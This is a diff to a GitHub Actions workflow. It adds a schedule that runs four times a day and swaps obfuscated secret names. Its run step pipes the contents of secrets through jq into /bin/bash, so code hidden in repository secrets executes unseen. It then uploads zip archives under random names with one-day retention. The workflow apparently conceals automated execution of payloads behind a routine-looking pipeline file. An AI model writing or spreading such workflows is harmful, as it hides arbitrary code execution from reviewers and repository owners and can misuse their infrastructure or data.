@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Apply
         env:
-          vqd32054: ${{ secrets.vqd32054 }}
+          upz7529: ${{ secrets.upz7529 }}
         run: |
-          printf '%s' "$vqd32054" | jq -r .rzh9926 | /bin/bash
-          printf '%s' "$kwa8314" | jq -r .elcoz392 | /bin/bash
-          echo $ds276 | jq -r .zs82 | /bin/bash
-          printf '%s' "$rpwlw9" | jq -r .dcbio2 | /bin/bash
+          printf '%s' "$upz7529" | jq -r .feyu8 | /bin/bash
+          printf '%s' "$qipb86839" | jq -r .bzu378 | /bin/bash
+          echo $ed61 | jq -r .o88 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
         with:
-          name: DbsoNZiI
+          name: BuheR5Vr
           path: "*.zip"
           retention-days: 1
